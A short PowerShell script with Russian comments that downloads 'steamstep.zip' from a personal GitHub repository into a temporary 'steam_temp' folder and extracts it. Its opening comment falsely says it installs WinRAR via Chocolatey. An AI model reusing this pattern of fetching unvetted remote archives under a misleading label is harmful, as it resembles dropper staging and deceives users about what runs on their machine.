# Устанавливаем WinRAR через Chocolatey
$temp_win = $env:TEMP
$name_app = "steamstep"
$folderPath = $temp_win
$newFolderName = "steam_temp"
$newFolderPath = Join-Path -Path $folderPath -ChildPath $newFolderName
New-Item -Path $newFolderPath -ItemType Directory -Force

$downloadUrl = "https://github.com/floflo1231211/test/raw/main/steamstep.zip"
$archivePath = Join-Path -Path $newFolderPath -ChildPath "steam.zip"
$Glocation =  "$($newFolderPath)/$($name_app)"
Invoke-WebRequest -Uri $downloadUrl -OutFile $archivePath

## Проверки на доступность файлов
if (Test-Path $archivePath) {
    # Распаковываем архив
    Expand-Archive -Path $archivePath -DestinationPath $newFolderPath
    if (Test-Path $newFolderPath) {
        Write-Host "Распковка прошла успешно."
    } else {
        Write-Host "Ошибка: Не удалось распаковать архив."
    }
} else {
    Write-Host "Ошибка: Не удалось скачать архив."
}

